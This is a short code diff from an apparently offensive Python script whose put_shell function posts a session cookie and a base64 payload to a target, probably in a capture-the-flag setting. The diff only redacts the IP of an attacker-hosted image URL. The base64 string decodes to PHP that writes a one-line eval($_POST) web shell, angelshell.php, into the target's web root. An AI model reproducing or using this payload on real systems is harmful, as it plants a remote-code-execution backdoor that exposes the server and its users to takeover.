@@ -17,7 +17,7 @@ def put_shell(num):
     COOKIES = {"PHPSESSID":"8pk7eubo30kurme1k071eoi3g1"}
 
     data_eval = {
-        "image": "http://121.42.175.111:9999/pwnhub.png",
+        "image": "http://******/pwnhub.png",
         "pwnhub": "ZmlsZV9wdXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvYW5nZWxzaGVsbC5waHAnLCc8P3BocCBldmFsKFwkX1BPU1RbXCdjaG9wcGVyMTIzXCddKTs/PicpOw=="
     }
 
